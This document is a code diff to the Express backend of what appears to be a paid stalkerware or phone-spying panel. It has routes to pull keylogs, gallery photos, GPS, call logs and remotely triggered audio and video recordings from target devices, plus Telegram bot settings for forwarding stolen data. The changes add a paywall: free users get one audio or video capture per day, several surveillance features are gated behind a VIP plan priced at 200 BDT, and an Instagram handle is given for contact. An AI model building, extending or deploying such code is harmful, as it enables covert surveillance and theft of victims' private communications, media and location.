@@ -246,6 +246,47 @@ async function requireVIP(req, res, next) {
   }
 }
 
+// Free users get ONE use per day for a given feature (audio/video).
+// VIP users and admin bypass the limit entirely.
+function checkDailyLimit(column) {
+  return async function (req, res, next) {
+    try {
+      const plan = await getUserPlan(req.session.userId);
+      if (plan === 'vip' || req.session.role === 'admin') return next();
+
+      const today = new Date().toISOString().slice(0, 10);
+      const result = await pool.query(
+        `SELECT ${column} FROM users WHERE id=$1`,
+        [req.session.userId]
+      );
+      const usedDate = result.rows.length ? result.rows[0][column.toLowerCase()] : null;
+      const usedDateStr = usedDate ? new Date(usedDate).toISOString().slice(0, 10) : null;
+
+      if (usedDateStr === today) {
+        return res.status(403).json({
+          locked: true,
+          dailyLimit: true,
+          plan: 'free',
+          message: 'Free plan e din e 1 bar e use korte parben. VIP nile unlimited pabe.'
+        });
+      }
+
+      await pool.query(
+        `UPDATE users SET ${column} = CURRENT_DATE WHERE id=$1`,
+        [req.session.userId]
+      );
+
+      next();
+    } catch (error) {
+      console.error(error);
+      res.status(500).json({ error: 'Access verification failed.' });
+    }
+  };
+}
+
+const checkVoiceLimit = checkDailyLimit('voice_used_date');
+const checkVideoLimit = checkDailyLimit('video_used_date');
+
 const deviceStates = new Map();
 const keylogs = [];
 const galleryData = new Map();
@@ -325,13 +366,17 @@ app.get("/api/access", requireLogin, async (req, res) => {
 
     const user = result.rows[0];
     const plan = await getUserPlan(req.session.userId);
+    const today = new Date().toISOString().slice(0, 10);
+    const voiceDateStr = user.voice_used_date ? new Date(user.voice_used_date).toISOString().slice(0, 10) : null;
+    const videoDateStr = user.video_used_date ? new Date(user.video_used_date).toISOString().slice(0, 10) : null;
 
     res.json({
       success: true,
       plan,
+      role: req.session.role,
       vipExpiresAt: plan === 'vip' ? user.vip_expires_at : null,
-      voiceUsedToday: user.voice_used_date === new Date().toISOString().slice(0, 10),
-      videoUsedToday: user.video_used_date === new Date().toISOString().slice(0, 10),
+      voiceUsedToday: voiceDateStr === today,
+      videoUsedToday: videoDateStr === today,
       price: 200,
       currency: "BDT",
       instagram: "whs_.jahidul"
@@ -504,7 +549,7 @@ app.get("/api/keylog", requireLogin, async (req, res) => {
 });
 
 // ========== GALLERY ==========
-app.post("/api/gallery/request", requireLogin, async (req, res) => {
+app.post("/api/gallery/request", requireLogin, requireVIP, async (req, res) => {
   const { deviceId, count } = req.body;
   if (!deviceId) return res.status(400).json({ error: "deviceId required" });
   const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
@@ -536,7 +581,7 @@ app.post("/api/gallery/upload", async (req, res) => {
   } catch (e) { console.error(e); res.status(500).json({ error: "Gallery upload failed" }); }
 });
 
-app.get("/api/gallery", requireLogin, async (req, res) => {
+app.get("/api/gallery", requireLogin, requireVIP, async (req, res) => {
   const { deviceId } = req.query;
   if (!deviceId) return res.status(400).json({ error: "deviceId required" });
   const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
@@ -565,7 +610,7 @@ app.get("/api/gps/request", async (req, res) => {
 });
 
 // ========== AUDIO ==========
-app.post("/api/audio/request", requireLogin, async (req, res) => {
+app.post("/api/audio/request", requireLogin, checkVoiceLimit, async (req, res) => {
   try {
     const { deviceId, duration } = req.body;
     if (!deviceId) return res.status(400).json({ error: "deviceId required" });
@@ -622,7 +667,7 @@ app.get("/api/audio/download/:filename", requireLogin, async (req, res) => {
 });
 
 // ========== VIDEO ==========
-app.post("/api/video/request", requireLogin, async (req, res) => {
+app.post("/api/video/request", requireLogin, checkVideoLimit, async (req, res) => {
   try {
     const { deviceId, duration, cameraType } = req.body;
     if (!deviceId) return res.status(400).json({ error: "deviceId required" });
@@ -700,7 +745,7 @@ app.get("/api/calllogs", requireLogin, async (req, res) => {
 });
 
 // ========== TELEGRAM SETTINGS ==========
-app.post("/api/telegram/settings", requireLogin, async (req, res) => {
+app.post("/api/telegram/settings", requireLogin, requireVIP, async (req, res) => {
   try {
     const { botToken, chatId, notifBotToken, notifChatId } = req.body;
     await pool.query(
@@ -712,7 +757,7 @@ app.post("/api/telegram/settings", requireLogin, async (req, res) => {
   } catch (e) { console.error(e); res.status(500).json({ error: "Failed to save Telegram settings." }); }
 });
 
-app.get("/api/telegram/settings", requireLogin, async (req, res) => {
+app.get("/api/telegram/settings", requireLogin, requireVIP, async (req, res) => {
   try {
     const result = await pool.query("SELECT bot_token, chat_id, notif_bot_token, notif_chat_id FROM user_telegram WHERE user_id=$1", [req.session.userId]);
     if (result.rows.length === 0) return res.json({ botToken: null, chatId: null, notifBotToken: null, notifChatId: null });
@@ -721,7 +766,7 @@ app.get("/api/telegram/settings", requireLogin, async (req, res) => {
   } catch (e) { console.error(e); res.status(500).json({ error: "Failed to fetch Telegram settings." }); }
 });
 
-app.post("/api/gallery/export", requireLogin, async (req, res) => {
+app.post("/api/gallery/export", requireLogin, requireVIP, async (req, res) => {
   try {
     const { deviceId } = req.body;
     if (!deviceId) return res.status(400).json({ error: "deviceId required" });
